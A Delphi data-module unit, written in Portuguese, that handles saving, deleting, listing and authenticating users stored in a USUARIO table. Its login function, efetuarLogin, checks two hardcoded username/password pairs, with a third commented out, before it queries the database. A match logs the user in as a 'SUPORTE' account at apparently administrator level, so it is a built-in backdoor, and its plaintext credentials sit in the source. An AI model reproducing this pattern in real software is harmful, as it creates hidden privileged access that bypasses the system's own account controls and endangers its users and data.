unit U_DtmDadosUsuario;

interface

uses
  System.SysUtils, System.Classes, U_DtmPadrao, Datasnap.Provider, Data.DB,
  Datasnap.DBClient, Data.Win.ADODB, System.Variants;

type
  TDtmDadosUsuario = class(TDtmPadrao)
    cdsPesquisacodigo: TLargeintField;
    cdsPesquisanome: TStringField;
    cdsPesquisalogin: TStringField;
    cdsPesquisasenha: TStringField;
    cdsPesquisanivel: TIntegerField;
  private
    { Private declarations }
  public
    { Public declarations }
    function gravarUsuario(nome,login,senha:string;var codigo:integer; nivel:integer = 0):Boolean;
    procedure excluirUsuario(codigo:Integer);
    procedure carregarGradeUsuario();
    function existeLogin(login:string; var codigo:integer):Boolean;
    function efetuarLogin(login,senha:string):Boolean;
  end;

var
  DtmDadosUsuario: TDtmDadosUsuario;

implementation

{%CLASSGROUP 'Vcl.Controls.TControl'}

uses U_DtmConexao, U_BibliotecaFuncoes;

{$R *.dfm}

{ TDtmDadosUsuario }

procedure TDtmDadosUsuario.carregarGradeUsuario;
begin
  cdsPesquisa.Close;
  QryPesquisa.Close;
  QryPesquisa.SQL.Text := ' SELECT * FROM USUARIO ';
  cdsPesquisa.Open;
end;

function TDtmDadosUsuario.efetuarLogin(login, senha: string): Boolean;
begin
   if ( ( ( login = 'RIBA')  and (senha = 'DSV*123'))
   OR   ( ( login = 'WIL')   and (senha = 'FUMO'))
   //OR   ( ( login = 'JADER') and (senha = 'EXPERTISE01'))
   )then
   begin
     DtmConexao.UsuarioLogado.nome := 'SUPORTE';
     DtmConexao.UsuarioLogado.login :='SUPORTE';
     DtmConexao.UsuarioLogado.nivel := 1;
     Result := True;
   end
   else
   begin
     QryAux.Close;
     QryAux.SQL.Text := ' SELECT * FROM USUARIO WHERE LOGIN = :LOGIN AND SENHA = :SENHA ';
     QryAux.Parameters.ParamByName('LOGIN').Value:= login;
     QryAux.Parameters.ParamByName('SENHA').Value := criptografar(senha);
     QryAux.Open;
     result := not QryAux.IsEmpty;

     if Result then
     begin
       DtmConexao.UsuarioLogado.codigo := QryAux.FieldByName('CODIGO').Value;
       DtmConexao.UsuarioLogado.nome := QryAux.FieldByName('NOME').Value;
       DtmConexao.UsuarioLogado.login := QryAux.FieldByName('LOGIN').Value;
       DtmConexao.UsuarioLogado.senha := QryAux.FieldByName('SENHA').Value;
       if QryAux.FieldByName('NIVEL').Value <> Null then
        DtmConexao.UsuarioLogado.nivel := QryAux.FieldByName('NIVEL').Value
       else
         DtmConexao.UsuarioLogado.nivel := 0;
     end;
   end;
end;

procedure TDtmDadosUsuario.excluirUsuario(codigo: Integer);
begin
  QryAux.Close;
  QryAux.SQL.Text := ' DELETE FROM USUARIO WHERE CODIGO = :CODIGO ';
  QryAux.Parameters.ParamByName('CODIGO').Value := codigo;
  QryAux.ExecSQL;
end;

function TDtmDadosUsuario.existeLogin(login: string;
  var codigo: integer): Boolean;
begin
   QryAux.Close;
   QryAux.SQL.Text := ' SELECT * FROM USUARIO WHERE LOGIN =:LOGIN ';
   QryAux.Parameters.ParamByName('LOGIN').Value := login;
   // VERIFICAR SE O USUÁRIO A SER ATUALIZADO SERÁ IGUAL A UMA OUTRO
   // OU SEJA CODIGO DIFERENTE DO QUE ESTA SENDO ATUALIZADO =)
   if ( codigo <> -1 ) then
   begin
      QryAux.SQL.Append(' AND CODIGO <> :CODIGO ');
      QryAux.Parameters.ParamByName('CODIGO').Value := codigo;
   end;

   QryAux.Open;

   Result := not QryAux.IsEmpty;
end;

function TDtmDadosUsuario.gravarUsuario(nome, login, senha: string;
  var codigo: integer; nivel: integer): Boolean;
begin
   QryAux.Close;
   if ( codigo <> -1 ) then
     QryAux.SQL.Text := ' UPDATE USUARIO SET NOME = :NOME, LOGIN=:LOGIN, SENHA=:SENHA, NIVEL=:NIVEL WHERE CODIGO =:CODIGO '
   else
     QryAux.SQL.Text := ' INSERT INTO USUARIO (NOME,LOGIN,SENHA, NIVEL) VALUES ( :NOME,:LOGIN,:SENHA, :NIVEL ) ';

   QryAux.Parameters.ParamByName('NOME').Value  := nome;
   QryAux.Parameters.ParamByName('LOGIN').Value := login;
   QryAux.Parameters.ParamByName('SENHA').Value := criptografar( senha );
   QryAux.Parameters.ParamByName('NIVEL').Value := nivel;

   QryAux.ExecSQL;
   Result := True;
end;

end.
